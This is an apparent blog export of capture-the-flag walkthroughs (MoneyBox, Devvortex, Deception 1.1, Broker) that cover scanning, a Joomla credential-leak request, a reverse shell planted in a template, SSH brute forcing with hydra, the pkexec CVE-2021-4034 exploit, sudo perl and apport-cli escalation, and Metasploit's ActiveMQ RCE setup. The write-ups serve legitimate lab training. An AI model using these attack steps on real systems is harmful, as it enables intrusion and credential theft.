renu@MoneyBox:~/.ssh$ ssh -i id_rsa lily@localhostThe authenticity of host 'localhost (::1)' can not be established.ECDSA key fingerprint is SHA256:8GzSoXjLv35yJ7cQf1EE0rFBb9kLK/K1hAjzK/IXk8I.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts.Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80lily@MoneyBox:~$ sudo -lMatching Defaults entries for lily on MoneyBox: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser lily may run the following commands on MoneyBox: (ALL : ALL) NOPASSWD: /usr/bin/perllily@MoneyBox:~$ sudo perl -e 'exec \"/bin/bash\";'root@MoneyBox:/home/lily# cd /rootroot@MoneyBox:~# whoamirootroot@MoneyBox:~# iduid=0(root) gid=0(root) groups=0(root)root@MoneyBox:~# ls -altotal 32drwx------ 3 root root 4096 Dec 3 01:07 .drwxr-xr-x 18 root root 4096 Oct 11 2022 ..-rw------- 1 root root 2738 Oct 11 2022 .bash_history-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwxr-xr-x 3 root root 4096 Feb 25 2021 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 33 Dec 3 01:07 proof.txt-rw-r--r-- 1 root root 228 Feb 26 2021 .root.txtroot@MoneyBox:~# cat proof.txtcb859ccb6cb0aa93dc96b6e322fe2f5droot@MoneyBox:~# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever3: ens35: mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000 link/ether 00:50:56:ba:f6:4a brd ff:ff:ff:ff:ff:ff inet 192.168.171.230/24 brd 192.168.171.255 scope global ens35 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:feba:f64a/64 scope link valid_lft forever preferred_lft foreverroot@MoneyBox:~# hostnameMoneyBoxroot@MoneyBox:~# cat /home/renu/local.txt1e6983bc9cccc471cf683a1ee3edc60eroot@MoneyBox:~#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Devvortex", "url": "/posts/Devvortex/", "categories": "HackTheBox", "tags": "Joomla, Password Cracking, PrivEsc, apport-cli, mysql", "date": "2023-12-10 00:00:00 +0530", "snippet": "> HackTheBox Easy Machine [Devvortex](https://app.hackthebox.com/machines/Devvortex){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Devvortex]â””â”€$ sudo nmap -sC -sV -p-...", "content": "> HackTheBox Easy Machine [Devvortex](https://app.hackthebox.com/machines/Devvortex){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Devvortex]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.242 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-27 15:27 ISTNmap scan report for 10.10.11.242Host is up (0.16s latency).Not shown: 65481 closed tcp ports (reset), 37 filtered tcp ports (no-response), 15 filtered tcp ports (host-unreach)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://devvortex.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸I checked port 80 and redirected to a domain name after setting the domain name as `devvortex.htb` I got the access for website â†’![Untitled](Devvortex/Untitled%201.png)I then again looked for another subdomain and with Tool ffuf I got a subdomain as `dev.devvortex.htb` , Lets set the `/etc/hosts` file for it and load that site â†’![Untitled](Devvortex/Untitled%202.png)Through source code I observed that this site is a CMS from `Joomla` so I enumerated further as a Joomla CMS and got its version file â†’![Untitled](Devvortex/Untitled%203.png)Now I looked for exploit related to it and I got one â†’**[Joomla! v4.2.8 - Unauthenticated information disclosure](https://www.exploit-db.com/exploits/51334)**I ran manually and I got the credentials through it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Devvortex]â””â”€$ curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true* Trying 10.10.11.242:80...* Connected to dev.devvortex.htb (10.10.11.242) port 80> GET /api/index.php/v1/config/application?public=true HTTP/1.1> Host: dev.devvortex.htb> User-Agent: curl/8.4.0> Accept: */*> Please check back again soon.\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"display_offline_message\":1,\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"offline_image\":\"\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"sitename\":\"Development\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"editor\":\"tinymce\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"captcha\":\"0\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\"* Connection #0 to host dev.devvortex.htb left intact:{\"list_limit\":20,\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"access\":1,\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"debug\":false,\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"debug_lang\":false,\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"debug_lang_const\":true,\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"dbtype\":\"mysqli\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"host\":\"localhost\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"user\":\"lewis\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"password\":\"\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"db\":\"joomla\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"dbprefix\":\"sd4fg_\",\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"dbencryption\":0,\"id\":224}},{\"type\":\"application\",\"id\":\"224\",\"attributes\":{\"dbsslverifyservercert\":false,\"id\":224}}],\"meta\":{\"total-pages\":4}}```{: .nolineno}As I got the password I logged into the Joomla portal as user `lewis` â†’![Untitled](Devvortex/Untitled%204.png)Now I included the reverse shell code in `/templates/cassiopeia/error.php` file â†’![Untitled](Devvortex/Untitled%205.png)I ran the `error.php` and I got the reverse shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Devvortex]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.63] from (UNKNOWN) [10.10.11.242] 60886Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 09:08:12 up 21 min, 4 users, load average: 0.07, 0.61, 0.60USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATlogan pts/0 10.10.16.17 08:47 1:13 0.21s 0.21s -bashlogan pts/1 10.10.14.52 08:50 16:36 0.09s 0.09s -bashlogan pts/2 10.10.14.52 08:52 3:24 0.28s 0.28s -bashlogan pts/4 10.10.15.3 09:04 1.00s 0.06s 0.06s -bashuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can not access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@devvortex:/$ whoamiwhoamiwww-datawww-data@devvortex:/$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@devvortex:/$```{: .nolineno}Through mysql database I got this data â†’```bashmysql> select * from sd4fg_users \\G;*************************** 1. row *************************** id: 649 name: lewis username: lewis email: lewis@devvortex.htb password: $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u block: 0 sendEmail: 1 registerDate: 2023-09-25 16:44:24lastvisitDate: 2023-12-04 09:40:59 activation: 0 params: lastResetTime: NULL resetCount: 0 otpKey: otep: requireReset: 0 authProvider: *************************** 2. row *************************** id: 650 name: logan paul username: logan email: logan@devvortex.htb password: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/changes block: 0 sendEmail: 0 registerDate: 2023-09-26 19:15:42lastvisitDate: NULL activation: params: {\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"timezone\":\"\",\"a11y_mono\":\"0\",\"a11y_contrast\":\"0\",\"a11y_highlight\":\"0\",\"a11y_font\":\"0\"}lastResetTime: NULL resetCount: 0 otpKey: otep: requireReset: 0 authProvider: 2 rows in set (0.00 sec)ERROR: No query specifiedmysql>```{: .nolineno}Now Lets crack the hash for logan and lets see if I can get the password or not I used `John The Ripper` Tool for it â†’![Untitled](Devvortex/Untitled%206.png)## SSH Shell â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Devvortex]â””â”€$ ssh logan@10.10.11.242 The authenticity of host '10.10.11.242 (10.10.11.242)' can not be established.ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:24: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.242' (ED25519) to the list of known hosts.logan@10.10.11.242 ispassword: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)......logan@devvortex:~$ whoamiloganlogan@devvortex:~$ iduid=1000(logan) gid=1000(logan) groups=1000(logan)logan@devvortex:~$ ls -altotal 32drwxr-xr-x 4 logan logan 4096 Dec 4 09:54 .drwxr-xr-x 3 root root 4096 Sep 26 19:16 ..lrwxrwxrwx 1 root root 9 Oct 26 14:58 .bash_history -> /dev/null-rw-r--r-- 1 logan logan 220 Sep 26 19:16 .bash_logout-rw-r--r-- 1 logan logan 3771 Sep 26 19:16 .bashrcdrwx------ 2 logan logan 4096 Oct 26 15:12 .cachedrwxrwxr-x 3 logan logan 4096 Dec 4 09:54 .config-rw-r--r-- 1 logan logan 807 Sep 26 19:16 .profile-rw-r----- 1 root logan 33 Dec 4 09:31 user.txtlogan@devvortex:~$ cat user.txteb033792e4f190d86fa5dec30f37e31blogan@devvortex:~$```{: .nolineno}Now lets root this machine â†’```bashlogan@devvortex:~$ sudo -l[sudo] password for logan: Matching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-clilogan@devvortex:~$ /usr/bin/apport-cli --helpUsage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]Options: -h, --help show this help message and exit -f, --file-bug Start in bug filing mode. Requires --package and an optional --pid, or just a --pid. If neither is given, display a list of known symptoms. (Implied if a single argument is given.) -w, --window Click a window as a target for filing a problem report. -u UPDATE_REPORT, --update-bug=UPDATE_REPORT Start in bug updating mode. Can take an optional --package. -s SYMPTOM, --symptom=SYMPTOM File a bug report about a symptom. (Implied if symptom name is given as only argument.) -p PACKAGE, --package=PACKAGE Specify package name in --file-bug mode. This is optional if a --pid is specified. (Implied if package name is given as only argument.) -P PID, --pid=PID Specify a running program in --file-bug mode. If this is specified, the bug report will contain more information. (Implied if pid is given as only argument.) --hanging The provided pid is a hanging application. -c PATH, --crash-file=PATH Report the crash from given .apport or .crash file instead of the pending ones in /var/crash. (Implied if file is given as only argument.) --save=PATH In bug filing mode, save the collected information into a file instead of reporting it. This file can then be reported later on from a different machine. --tag=TAG Add an extra tag to the report. Can be specified multiple times. -v, --version Print the Apport version number.logan@devvortex:~$```{: .nolineno}This `apport-cli` is a Tool used to â†’### DESCRIPTION for apport-cli Tool â¤µï¸- `apport` automatically collects data from crashed processes and compiles a problem report in /var/crash/.- This is a command line frontend for reporting those crashes to the developers. It can also be used to report bugs about packâ€ages or running processes.- If symptom scripts are available, it can also be given the name of a symptom, or be called with just -f to display a list of known symptoms.Lets see its version â†’```bashlogan@devvortex:~$ /usr/bin/apport-cli --version2.20.11logan@devvortex:~$```{: .nolineno}I check online and after enumeration this version is vulnerable to **[Improper Privilege Management](https://security.snyk.io/vuln/SNYK-UBUNTU2004-APPORT-5422150) â¤µï¸** > A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege. It is extremely unlikely that a system administrator would configure sudo to allow unprivileged users to perform this class of exploit.{: .prompt-info }So here I used the crash command flag (-c) and the crash file location within which I got one random file I used it â†’```bashsudo /usr/bin/apport-cli -c /var/crash/.crash```{: .nolineno}After entering this command I would get root access but the crash file is deleted from the machine and I canâ€™t execute this command so canâ€™t able to get root access .> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Deception : 1.1", "url": "/posts/Deception-1.1/", "categories": "VulnHub", "tags": "Password Bruteforce, Recon, SUIDs, Password Generate, pkexec", "date": "2023-12-10 00:00:00 +0530", "snippet": "## **Descriptionâž¡ï¸**ðŸ’¡ This machine is the next part of [Deception](https://www.vulnhub.com/entry/haclabs-deception11,440/) machine. This time try harder to get root!To complete this challenge you n...", "content": "## **Descriptionâž¡ï¸**ðŸ’¡ This machine is the next part of [Deception](https://www.vulnhub.com/entry/haclabs-deception11,440/) machine. This time try harder to get root!To complete this challenge you need to find 3 flags.flag 2 : Password to unzip the zip file.flag 1 : Present in /home/yash/flag 0 : Present in /root/This is a beginner/intermediate level machine.Technical Information :- machine is based on Ubuntu 64bit- Tested on virtualBox- DHCP is enabled (set as bridged networking)NOTE : you may face connection lost issue , no problem restart the virtual machine and everything will start to work again!I found \"`646563657074696f6e312e31`\" this while creating the machine .ContactIf you have solved this machine in an unintended way then please let us know, you may get a chance to publish your writeup on our website.This works better with VirtualBox than VMware. Note: This is MEANT to be password protected- Now lets decode the found value and after decoding which is a hex value I got this â¤µï¸ - `deception1.1`![Untitled](Deception-1/Untitled%201.png)Now with this I unziped this Deception File and Now letâ€™s dig into it â¤µï¸Letâ€™s find out about the victim machines IP address â¤µï¸![Untitled](Deception-1/Untitled%202.png)```bashIP : 10.0.2.41```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](Deception-1/Untitled%203.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Deception1.1]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.41Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 21:59 ISTNmap scan report for 10.0.2.41Host is up (0.0018s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 75b393d4f10230bf35ea124e3be7fa4a (RSA)| 256 f98c435b457dfe84b1f593a368bbce84 (ECDSA)|_ 256 772a333e8f2b65a5f3dfb5bc584af48e (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Site dose not have a title (text/html).|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 08:00:27:73:99:30 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸![Untitled](Deception-1/Untitled%204.png)Now letâ€™s Enter the password check with some difficulty like for example `ABD@3291#nano` .In return I got the alert like this â¬‡ï¸![Untitled](Deception-1/Untitled%205.png)with this message â¬‡ï¸![Untitled](Deception-1/Untitled%206.png)Now I guess that file â€œ`0000flagflagflagflag.php`â€ , where flag=1 so the file becomes âž¡ï¸ â€œ`00001111.php`â€Lets try it out now â¤µï¸![Untitled](Deception-1/Untitled%207.png)Source code â¬‡ï¸![Untitled](Deception-1/Untitled%208.png)I need to find this password.txt file that alerted me on this page , so while enumerating I got the password.txt file in this location â¤µï¸ ![Untitled](Deception-1/Untitled%209.png)Now lets create a password.txt file with password ya5h[a-z,a-z] >```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Deception1.1]â””â”€$ crunch 6 6 -t ya5h@@ -o password.txt Crunch will now generate the following amount of data: 4732 bytes0 MB0 GB0 TB0 PBCrunch will now generate the following number of lines: 676 crunch: 100% completed generating output```{: .nolineno}{: file='password.txt'}Now lets brute force the password for user yash through hydra Tool â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Deception1.1]â””â”€$ hydra -l yash -P password.txt ssh://10.0.2.85 -t 64Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-03 11:15:23[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 64 tasks per 1 server, overall 64 tasks, 676 login tries (l:1/p:676), ~11 tries per task[DATA] attacking ssh://10.0.2.85:22/[22][ssh] host: 10.0.2.85 login: yash password: ya5hay1 of 1 target successfully completed, 1 valid password found[WARNING] Writing restore file because 22 final worker threads did not complete until end.[ERROR] 22 targets did not resolve or could not be connected[ERROR] 0 target did not completeHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-03 11:15:29```{: .nolineno}I have the credentials for yash user lets login â†’```{: .nolineno}yash : ya5hay```{: .nolineno}{: file='Credentials.txt'}## SSH Shell â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Deception1.1]â””â”€$ ssh yash@10.0.2.85 The authenticity of host '10.0.2.85 (10.0.2.85)' can not be established.ED25519 key fingerprint is SHA256:5fFIrbx9dprTzc1L8D0uqW8A+OlWNpClw43cf4Klki4.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.0.2.85' (ED25519) to the list of known hosts.yash@10.0.2.85 ispassword: Linux haclabs 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Thu Mar 19 17:15:53 2020yash@haclabs:~$ whoamiyashyash@haclabs:~$ iduid=1000(yash) gid=1000(yash) groups=1000(yash),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)yash@haclabs:~$```{: .nolineno}Now I found pkexec in the SUIDs file so I checked its version , the availability of gcc and python3 too . so that if the version is 0.105 means it is vulnerable and I have exploit for that , That exploit can lead me to root access â†’```bashyash@haclabs:~$ find / -perm -u=s -type f 2>/dev/null/usr/bin/su/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/chsh/usr/bin/chfn/usr/bin/umount/usr/bin/pkexec/usr/bin/mount/usr/bin/passwd/usr/bin/sudo/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helperyash@haclabs:~$ which python3/usr/bin/python3yash@haclabs:~$ which gcc/usr/bin/gccyash@haclabs:~$ pkexec --versionpkexec version 0.105yash@haclabs:~$ cd /tmpyash@haclabs:/tmp$```{: .nolineno}> That means I can try this exploit [CVE-2021-4034](https://github.com/mebeim/CVE-2021-4034) â†’{: .prompt-tip }I transfered the files through wget commands and its time to try this exploit â†’```bashyash@haclabs:/tmp$ yash@haclabs:/tmp$ lsexpl.shfake_module.chelper.csystemd-private-226a75322e014b62851f0e74e443ad31-apache2.service-ze9pxysystemd-private-226a75322e014b62851f0e74e443ad31-systemd-timesyncd.service-jYzPAjyash@haclabs:/tmp$ ./expl.sh Pwned!# whoamiroot# iduid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner),1000(yash)# cd /root# ls -altotal 36drwx------ 3 root root 4096 Mar 19 2020 .drwxr-xr-x 18 root root 4096 Mar 9 2020 ..-rw------- 1 root root 164 Mar 19 2020 .bash_history-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc-rw------- 1 root root 38 Mar 9 2020 .lesshstdrwxr-xr-x 3 root root 4096 Mar 8 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 66 Mar 9 2020 .selected_editor-rw-r--r-- 1 root root 1753 Mar 10 2020 root_flag.txt# cat root_flag.txt _ _ _ _ _ (_) (_) (_) _ (_) _ (_) _ _ _ (_) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ (_) _ _ _ _ _ _ _ _ _ _ _ (_)(_) (_)(_) _(_)(_)(_)(_) (_)(_)(_)(_)_ _(_)(_)(_)(_)(_)(_)(_)_ (_)(_)(_)(_)_(_)(_)(_)(_)(_)(_) _ (_)(_)(_) _ (_)(_)(_)(_)_ (_) (_) (_) (_)(_) _ _ _ (_)(_) (_) _ _ _ (_)(_) (_) (_) (_) (_) (_)(_) (_) (_) (_) (_) (_)(_)(_)(_)(_)(_)(_) (_)(_)(_)(_)(_)(_) (_) (_) _ (_) (_) (_)(_) (_) (_) _ _ (_) (_)_ _ _ (_)(_)_ _ _ _ (_)_ _ _(_)_ _ _ _ (_) _ _ _(_) (_)_ _(_)_ (_) _(_) _ _ _ (_)(_) (_) _ (_) _ (_)(_) _ (_) _ (_)(_)(_)(_) (_)(_)(_)(_) (_)(_)(_) (_)(_)(_)(_) (_)(_)(_)(_) (_)(_) (_)(_)(_) (_)(_)(_) (_) (_) (_)(_)(_) (_)(_) (_)(_)(_) (_) (_) ----------------------------------Visit our website : https://www.haclabs.orgSubmit walkthrough at : yash@haclabs.org#```{: .nolineno}Now I am Root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Broker", "url": "/posts/Broker/", "categories": "HackTheBox", "tags": "ActiveMQ, Metasploit, Nginx, PrivEsc, Public Exploit", "date": "2023-12-10 00:00:00 +0530", "snippet": "> HackTheBox Easy Machine [Broker](https://app.hackthebox.com/machines/Broker){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Broken]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN ...", "content": "> HackTheBox Easy Machine [Broker](https://app.hackthebox.com/machines/Broker){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Broken]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.243 [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-05 20:47 ISTWarning: 10.10.11.243 giving up on port because retransmission cap hit (6).Nmap scan report for 10.10.11.243Host is up (0.17s latency).Not shown: 65521 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Error 401 Unauthorized| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm|_http-server-header: nginx/1.18.0 (Ubuntu)1883/tcp open mqtt|_mqtt-subscribe: Failed to receive control packet from server.4032/tcp filtered vrts-auth-port5672/tcp open amqp?|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: | AMQP| AMQP| amqp:decode-error|_ 7Connection from client using unsupported AMQP attempted8161/tcp open http Jetty 9.4.39.v20210325|_http-title: Error 401 Unauthorized|_http-server-header: Jetty(9.4.39.v20210325)| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm15379/tcp filtered unknown15994/tcp filtered unknown43549/tcp open tcpwrapped55093/tcp filtered unknown57897/tcp filtered unknown61613/tcp open stomp Apache ActiveMQ| fingerprint-strings: | HELP4STOMP: | ERROR| content-type:text/plain| message:Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)| org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)| org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)| org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)| org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)|_ java.lang.Thread.run(Thread.java:750)61614/tcp open http Jetty 9.4.39.v20210325|_http-title: Site does not have a title.|_http-server-header: Jetty(9.4.39.v20210325)| http-methods: |_ Potentially risky methods: TRACE61616/tcp open apachemq ActiveMQ OpenWire transport| fingerprint-strings: | NULL: | ActiveMQ| TcpNoDelayEnabled| SizePrefixDisabled| CacheSize| ProviderName | ActiveMQ| StackTraceEnabled| PlatformDetails | Java| CacheEnabled| TightEncodingEnabled| MaxFrameSize| MaxInactivityDuration| MaxInactivityDurationInitalDelay| ProviderVersion |_ 5.15.153 services unrecognized despite returning data.```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸I checked port 80 and I encounterd with a login popup , I tried `admin : admin` and I am in â†’![Untitled](Broker/Untitled%201.png)Found out that this site is of ActiveMQ and running on version `5.15.15` I checked online about any vulnerability and I got one `CVE 2023-46604` .![Untitled](Broker/Untitled%202.png)I got an exploit module from this reference and information â†’[Critical Vulnerability: Exploitation of Apache ActiveMQ CVE-2023-46604](https://www.huntress.com/blog/critical-vulnerability-exploitation-of-apache-activemq-cve-2023-46604)I searched on metasploit about activemq and I got the one which I wanted â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Broken]â””â”€$ msfconsole -q search activemqmsf6 > search activemqMatching Modules========= # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/apache_activemq_upload_jsp 2016-06-01 excellent No ActiveMQ web shell upload 1 exploit/windows/http/apache_activemq_traversal_upload 2015-08-19 excellent Yes Apache ActiveMQ 5.x-5.11.1 directory or files bruteforcing Shell Upload 2 auxiliary/scanner/http/apache_activemq_traversal normal No Apache ActiveMQ directory or files bruteforcing 3 auxiliary/scanner/http/apache_activemq_source_disclosure normal No Apache ActiveMQ JSP Files Source Disclosure 4 exploit/multi/misc/apache_activemq_rce_cve_2023_46604 2023-10-27 excellent Yes Apache ActiveMQ Unauthenticated Remote Code Execution 5 exploit/windows/browser/samsung_security_manager_put 2016-08-05 excellent No Samsung Security Manager 1.4 ActiveMQ Broker Service PUT Method Remote Code ExecutionInteract with a module by name or index. For example info 5, use 5 or use exploit/windows/browser/samsung_security_manager_putmsf6 >msf6 > use exploit/multi/misc/apache_activemq_rce_cve_2023_46604msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > optionsModule options (exploit/multi/misc/apache_activemq_rce_cve_2023_46604): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using -metasploit.html RPORT 61616 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random)Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) FETCH_COMMAND CERTUTIL yes Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL) FETCH_DELETE false yes Attempt to delete the binary after execution FETCH_FILENAME fNZjDBukaLtz no Name to use on remote system when storing payload; cannot 